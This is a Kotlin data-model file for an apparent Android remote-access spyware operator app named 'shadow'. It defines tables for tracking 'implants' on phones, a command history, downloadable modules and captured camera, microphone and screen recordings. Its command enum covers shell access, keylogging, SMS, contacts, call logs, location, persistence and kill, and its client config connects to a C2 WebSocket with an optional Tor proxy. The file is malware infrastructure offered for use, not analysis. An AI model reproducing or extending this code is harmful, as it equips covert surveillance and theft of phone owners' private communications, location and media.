package com.shadow.operator.data

import androidx.room.*
import kotlinx.serialization.Serializable
import java.time.Instant

@Entity(tableName = "implants",
    indices = [Index(value = ["implantId"], unique = true)]
)
data class ImplantEntity(
    @PrimaryKey(autoGenerate = true) val id: Long = 0,
    @ColumnInfo(name = "implant_id") val implantId: String,
    @ColumnInfo(name = "nickname") val nickname: String? = null,
    @ColumnInfo(name = "model") val model: String? = null,
    @ColumnInfo(name = "android_version") val androidVersion: String? = null,
    @ColumnInfo(name = "architecture") val architecture: String? = null,
    @ColumnInfo(name = "root_status") val rootStatus: Int = 0, // 0=unknown, 1=no, 2=yes, 3=magisk, 4=shizuku
    @ColumnInfo(name = "shizuku_status") val shizukuStatus: Boolean = false,
    @ColumnInfo(name = "battery_level") val batteryLevel: Int = -1,
    @ColumnInfo(name = "network_type") val networkType: String? = null,
    @ColumnInfo(name = "network_ip") val networkIp: String? = null,
    @ColumnInfo(name = "country_code") val countryCode: String? = null,
    @ColumnInfo(name = "installed_modules") val installedModules: String = "[]", // JSON array
    @ColumnInfo(name = "available_modules") val availableModules: String = "[]", // JSON array
    @ColumnInfo(name = "last_seen") val lastSeen: Long = System.currentTimeMillis(),
    @ColumnInfo(name = "first_seen") val firstSeen: Long = System.currentTimeMillis(),
    @ColumnInfo(name = "is_online") val isOnline: Boolean = false,
    @ColumnInfo(name = "tags") val tags: String = "[]", // JSON array
    @ColumnInfo(name = "notes") val notes: String = ""
)

@Entity(tableName = "command_history",
    indices = [Index("implant_id"), Index("timestamp")]
)
data class CommandHistoryEntity(
    @PrimaryKey(autoGenerate = true) val id: Long = 0,
    @ColumnInfo(name = "implant_id") val implantId: String,
    @ColumnInfo(name = "command_type") val commandType: String, // SHELL, FS, MEDIA, MODULE, etc.
    @ColumnInfo(name = "command_payload") val commandPayload: String,
    @ColumnInfo(name = "response_payload") val responsePayload: String? = null,
    @ColumnInfo(name = "status") val status: String, // PENDING, SENT, COMPLETED, FAILED
    @ColumnInfo(name = "timestamp") val timestamp: Long = System.currentTimeMillis(),
    @ColumnInfo(name = "duration_ms") val durationMs: Long = 0
)

@Entity(tableName = "module_registry",
    indices = [Index(value = ["module_name"], unique = true)]
)
data class ModuleRegistryEntity(
    @PrimaryKey(autoGenerate = true) val id: Long = 0,
    @ColumnInfo(name = "module_name") val moduleName: String,
    @ColumnInfo(name = "version") val version: String,
    @ColumnInfo(name = "description") val description: String,
    @ColumnInfo(name = "required_permissions") val requiredPermissions: String = "[]", // JSON
    @ColumnInfo(name = "min_api_level") val minApiLevel: Int = 21,
    @ColumnInfo(name = "size_bytes") val sizeBytes: Long = 0,
    @ColumnInfo(name = "sha256_hash") val sha256Hash: String,
    @ColumnInfo(name = "download_url") val downloadUrl: String,
    @ColumnInfo(name = "is_loaded") val isLoaded: Boolean = false,
    @ColumnInfo(name = "last_updated") val lastUpdated: Long = System.currentTimeMillis()
)

@Entity(tableName = "media_recordings",
    indices = [Index("implant_id"), Index("timestamp")]
)
data class MediaRecordingEntity(
    @PrimaryKey(autoGenerate = true) val id: Long = 0,
    @ColumnInfo(name = "implant_id") val implantId: String,
    @ColumnInfo(name = "media_type") val mediaType: String, // CAM_FRONT, CAM_BACK, MIC_LIVE, MIC_TIMED, SCREENSHOT, SCREEN_RECORD
    @ColumnInfo(name = "local_path") val localPath: String,
    @ColumnInfo(name = "remote_path") val remotePath: String? = null,
    @ColumnInfo(name = "duration_seconds") val durationSeconds: Int = 0,
    @ColumnInfo(name = "file_size") val fileSize: Long = 0,
    @ColumnInfo(name = "metadata") val metadata: String = "{}", // JSON: resolution, format, etc.
    @ColumnInfo(name = "timestamp") val timestamp: Long = System.currentTimeMillis()
)

@Serializable
data class Implant(
    val implantId: String,
    var nickname: String? = null,
    var model: String? = null,
    var androidVersion: String? = null,
    var architecture: String? = null,
    var rootStatus: RootStatus = RootStatus.UNKNOWN,
    var shizukuStatus: Boolean = false,
    var batteryLevel: Int = -1,
    var networkType: String? = null,
    var networkIp: String? = null,
    var countryCode: String? = null,
    var installedModules: List<String> = emptyList(),
    var availableModules: List<String> = emptyList(),
    var lastSeen: Long = System.currentTimeMillis(),
    var firstSeen: Long = System.currentTimeMillis(),
    var isOnline: Boolean = false,
    var tags: List<String> = emptyList(),
    var notes: String = ""
) {
    enum class RootStatus(val value: Int) {
        UNKNOWN(0), NO_ROOT(1), ROOTED(2), MAGISK(3), SHIZUKU(4)
    }
}

@Serializable
data class Command(
    val id: String = java.util.UUID.randomUUID().toString(),
    val implantId: String,
    val type: CommandType,
    val payload: String,
    val timestamp: Long = System.currentTimeMillis()
) {
    enum class CommandType(val value: String) {
        SHELL("shell"), FS("fs"), MEDIA("media"), MODULE("module"),
        SYSTEM("system"), KEYLOGGER("keylogger"), CONTACTS("contacts"),
        CALL_LOG("calllog"), SMS("sms"), LOCATION("location"),
        CAMERA("camera"), MICROPHONE("mic"), SCREEN("screen"),
        FILE_MANAGER("filemgr"), PERSISTENCE("persist"), KILL("kill")
    }
}

@Serializable
data class Frame(
    val id: String,
    val cmd: String,
    val payload: String,
    val ts: Long = System.currentTimeMillis(),
    val sessionId: String? = null
)

@Serializable
data class ModuleManifest(
    val name: String,
    val version: String,
    val description: String,
    val requiredPermissions: List<String>,
    val minApiLevel: Int,
    val sizeBytes: Long,
    val sha256: String,
    val downloadUrl: String
)

@Serializable
data class ClientConfig(
    val workerUrl: String = "wss://shadow.yourdomain.com",
    val operatorPubKey: String = "",
    val moduleSigningPubKey: String = "",
    val transportPubKey: String = "",
    val autoReconnect: Boolean = true,
    val reconnectIntervalSec: Int = 30,
    val maxReconnectAttempts: Int = -1,
    val useTor: Boolean = false,
    val torProxyHost: String = "127.0.0.1",
    val torProxyPort: Int = 9050
)